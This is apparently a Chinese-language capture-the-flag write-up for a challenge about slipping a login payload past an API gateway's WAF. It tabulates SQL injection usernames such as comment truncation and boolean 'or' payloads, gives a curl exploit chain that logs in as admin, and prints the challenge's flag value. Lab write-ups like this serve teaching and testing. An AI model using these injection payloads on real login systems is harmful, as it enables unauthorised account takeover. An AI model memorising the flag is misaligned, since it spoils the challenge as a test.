## 题目原文

> 某业务系统通过 API 网关接收请求，网关在转发前检测请求内容以拦截攻击，后端登录业务仍存在弱点。已获授权进行红队评估，设法让载荷绕过网关检测送达后端，获取仅管理员可见的受保护 flag。

## 题解

### 入口与指纹

登录页标题 `Login — Compressed API Portal`。说明文字写着 `API supports gzip-compressed requests (Content-Encoding: gzip)`，脚注是 `Protected by WAF`。表单字段仍是 `username`、`password`，`nginx/1.30.1`，PHP 会话。

### 关键观察

这台网关没有用前面几题那条 `or` 规则。下面这些用户名都到达了后端，没有一个是 403：

| 用户名 | 结果 |
| --- | --- |
| `admin` | 200，口令错误 |
| `admin' or '1'='1` | 302 到 `dashboard.php` |
| `admin'--`、`admin'-- -`、`admin'/**/-- -` | 302 |
| `admin'#` | 200，口令错误 |
| `' union select 1,2,3-- -`、`admin' union select 1-- -` | 200，没有变成管理员会话 |

注释截断和布尔注入都能登录。`union select` 到了后端，但没有变成一次成功登录，响应仍是登录页而不是 403。gzip 不是这条链路的前提。

### 利用链

```bash
T=$(head -1 .target)
curl -sS -c cj -b cj -D - -o /dev/null \
  --data-urlencode "username=admin'-- -" \
  --data-urlencode "password=x" \
  "http://$T/"
curl -sS -b cj "http://$T/dashboard.php"
```

仪表盘标题 `Dashboard — API Portal`。本次平台接受的值是 `flag{5fb70a12-69de-4f2b-b0e3-cb2a9734d8a0}`。

### flag 位置

登录后的 `dashboard.php`。
